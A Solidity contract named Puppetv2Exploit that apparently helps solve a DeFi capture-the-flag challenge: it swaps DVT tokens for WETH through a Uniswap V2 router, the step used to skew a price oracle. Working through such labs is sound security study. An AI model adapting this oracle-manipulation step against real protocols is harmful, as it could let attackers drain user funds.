// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "./Uniswap.sol";

// Courtesy of https://github.com/t4sk/defi-by-example/blob/main/contracts/interfaces/Uniswap.sol
contract Puppetv2Exploit {

    address public UNISWAP_V2_ROUTER;

    constructor (address _router) {
        UNISWAP_V2_ROUTER = _router;
    }

    // Swap DVT Tokens for WETH
    function swap(
        address _tokenIn,
        address _tokenOut,
        uint _amountIn,
        uint _amountOutMin,
        address _to
    ) external {
        IERC20(_tokenIn).transferFrom(msg.sender, address(this), _amountIn);
        IERC20(_tokenIn).approve(UNISWAP_V2_ROUTER, _amountIn);

        address[] memory path;
        path = new address[](2);

        path[0] = _tokenIn; // DVT tokens
        path[1] = _tokenOut; // WETH 

        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            _amountIn,
            _amountOutMin,
            path,
            _to,
            block.timestamp
        );
    }
}